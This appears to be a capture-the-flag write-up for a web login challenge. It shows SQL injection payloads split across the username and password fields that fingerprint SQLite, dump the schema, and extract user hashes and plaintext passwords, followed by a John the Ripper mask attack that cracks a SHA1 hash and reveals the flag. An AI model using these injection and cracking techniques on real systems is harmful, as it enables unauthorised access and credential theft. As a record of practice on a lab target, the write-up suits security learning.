---
created: 2025-06-06T18:16
updated: 2025-06-08T12:05
solves: 29
points: 479
---

I figured out that the server is running `sqlite` because the following works.

```python
username = f"admin'  AND sqlite_version()='1' /*"
password = "*/ AND '1'='1"
```

While the postgres version failed with an error.

```python
username = f"admin'  AND pg_backend_pid()='1' /*"
password = "*/ AND '1'='1"
```

After quite a while of experimenting, I finally got the server to return information to me.

The trick is to quote my dummy values into `'1'`, without it for some reason it won't work.

```python
username = f"admin' UNION SELECT sql,'1','1' FROM sqlite_master; /*"
password = "*/ AND '1'='1"
```

From here on its just normal SQL stuff.

We have 2 tables.

```html
<h4>Username: CREATE TABLE database(user varchar(255), pass varchar(255), time INT), Password (hashed): 1, 1 hours passed on this site.
Username: CREATE TABLE stats(user varchar(255), pass varchar(255), time INT), Password (hashed): 1, 1 hours passed on this site.
</h4>
```

## database table

```python
username = f"admin' UNION SELECT user,pass,time FROM database; /*"
password = "*/ AND '1'='1"
```

Seems like these are password hashes.

```html
<h4>Username: You, Password (hashed): 6b5f8e745378e0fc64ce20dc041974b05bf5c1cc, 500 hours passed on this site.
Username: humanA, Password (hashed): 9aa888e9ad7f219a13348362b4df4e41da33cb48, 2147483647 hours passed on this site.
Username: test, Password (hashed): 9a23b6d49aa244b7b0db52949c0932c365ec8191, 0 hours passed on this site.
Username: tuxtheflagmasteronlylikeslowercaseletters, Password (hashed): 64b7c90a991571c107cc663aa768514822896f49, 20 hours passed on this site.
</h4>
```

## stats table

```python
username = f"admin' UNION SELECT user,pass,time FROM stats; /*"
password = "*/ AND '1'='1"
```

And these are... plaintext passwords? except for `TuxTheFlagMaster`.

```html
<h4>Username: TuxTheFlagMaster, Password (hashed): 678a88c06eac9775545a26e33cbfacf1bcb2c7f559dfa95055d167117e529a29, 20 hours passed on this site.
Username: You, Password (hashed): ILOVEPENGUINS1234567890, 500 hours passed on this site.
Username: humanA, Password (hashed): definitelyARealHuman, 2147483647 hours passed on this site.
Username: test, Password (hashed): testPass, 0 hours passed on this site.
</h4>
```

## the hashes

Through guess and check using the password hash pairs, I confirmed that the hash are SHA1 hashes.

```
text -> hash (SHA1)
ILOVEPENGUINS1234567890 -> 6b5f8e745378e0fc64ce20dc041974b05bf5c1cc
definitelyARealHuman -> 9aa888e9ad7f219a13348362b4df4e41da33cb48
testPass -> 9a23b6d49aa244b7b0db52949c0932c365ec8191

??? -> 64b7c90a991571c107cc663aa768514822896f49
```

So now we need to find `x` such that `SHA(x) = 64b7c90a991571c107cc663aa768514822896f49`. (which is TuxTheFlagMaster's password)

```bash
echo "64b7c90a991571c107cc663aa768514822896f49" > sha1hash.txt

...# trying different lengths

john --format=raw-sha1 --mask='[a-z][a-z][a-z][a-z][a-z][a-z][a-z]' sha1hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=16
Press 'q' or Ctrl-C to abort, almost any other key for status
allsgud          (?)     
1g 0:00:00:36 DONE (2025-06-06 19:54) 0.02730g/s 31871Kp/s 31871Kc/s 31871KC/s yklsgud..fllsgud
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed.
```

The password is `allsgud`, which is not the flag.

But after logging in, the flag is there!

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1749254320/2025/06/cac39f95673e4b93b867e6a627e9e5a3.png)

```flag
tjctf{3verth1ng_i5_fin3}
```
